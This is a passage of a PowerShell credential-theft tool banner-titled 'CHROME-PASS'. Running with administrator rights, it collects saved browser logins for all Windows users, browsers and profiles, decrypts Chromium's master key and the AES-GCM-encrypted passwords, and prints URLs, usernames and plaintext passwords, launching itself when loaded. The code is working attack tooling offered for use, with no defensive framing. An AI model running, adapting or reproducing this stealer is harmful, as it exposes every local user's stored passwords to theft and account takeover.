    [void]$Sqlite3Close.Invoke($DbPtr)
    Start-Sleep -Milliseconds 300
    Remove-Item $TempDb -Force -ErrorAction SilentlyContinue

    return $Results
}

# ======================================================================
# Main Function
# ======================================================================
function Invoke-PowerChromeAll {
    param([switch]$Verbose)

    Write-Output @"

 ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗███████╗    ██████╗  █████╗ ███████╗███████╗
██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗ ████║██╔════╝    ██╔══██╗██╔══██╗██╔════╝██╔════╝
██║     ███████║██████╔╝██║   ██║██╔████╔██║█████╗█████╗██████╔╝███████║███████╗███████╗
██║     ██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝╚════╝██╔═══╝ ██╔══██║╚════██║╚════██║
╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗    ██║     ██║  ██║███████║███████║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                                                         
[Universal] All Users / All Browsers / All Profiles / All Chrome Versions

"@

    $Principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Output "[-] Administrator privileges required. Run as Admin!"
        return
    }

    Write-Output "[*] Running as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    Write-Output "[*] Scanning all users, browsers, and profiles...`n"

    $AllData = Get-AllBrowserLoginBlobs -Verbose:$Verbose

    if (-not $AllData -or $AllData.Count -eq 0) {
        Write-Output "[-] No browser data found."
        return
    }

    Write-Output "[+] Found $($AllData.Count) credential entries`n"

    $Grouped = $AllData | Group-Object -Property LocalStatePath
    $AllDecrypted = @()

    foreach ($Group in $Grouped) {
        $LocalStatePath = $Group.Name
        $Records = $Group.Group
        $First = $Records[0]

        Write-Output "[*] Processing: $($First.WindowsUser) / $($First.Browser) / $($First.Profile) [$($First.BlobType)]"

        $MasterKeyInfo = Decrypt-MasterKey -LocalStatePath $LocalStatePath -Browser $First.Browser

        if (-not $MasterKeyInfo) {
            Write-Output "    [-] Failed to get master key"
            continue
        }

        Write-Output "    [+] Key type: $($MasterKeyInfo.Type)"
        $MasterKey = $MasterKeyInfo.Key

        foreach ($Record in $Records) {
            $Raw = [Convert]::FromBase64String($Record.EncryptedPassword)
            if ($Raw.Length -lt 31) { continue }

            $Header = [Text.Encoding]::ASCII.GetString($Raw, 0, 3)
            
            $Offset = 0
            if ($Header -eq 'v10' -or $Header -eq 'v20') { $Offset = 3 }
            else { continue }

            try {
                $Nonce = $Raw[$Offset..($Offset + 11)]
                $Ciphertext = $Raw[($Offset + 12)..($Raw.Length - 17)]
                $Tag = $Raw[($Raw.Length - 16)..($Raw.Length - 1)]

                $Plain = DecryptWithAesGcm -Key $MasterKey -Iv $Nonce -Ciphertext $Ciphertext -Tag $Tag
                $Password = [Text.Encoding]::UTF8.GetString($Plain)

                $AllDecrypted += [PSCustomObject]@{
                    User = $Record.WindowsUser
                    Browser = $Record.Browser
                    Profile = $Record.Profile
                    URL = $Record.URL
                    Username = $Record.Username
                    Password = $Password
                }
            }
            catch {}
        }
    }

    if ($AllDecrypted.Count -gt 0) {
        Write-Output "`n[+] =========================================="
        Write-Output "[+] DECRYPTED: $($AllDecrypted.Count) credentials"
        Write-Output "[+] ==========================================`n"
        $AllDecrypted | Sort-Object User, Browser, URL | Format-Table -AutoSize
    }
    else {
        Write-Output "`n[-] No credentials decrypted."
    }
}

Invoke-PowerChromeAll
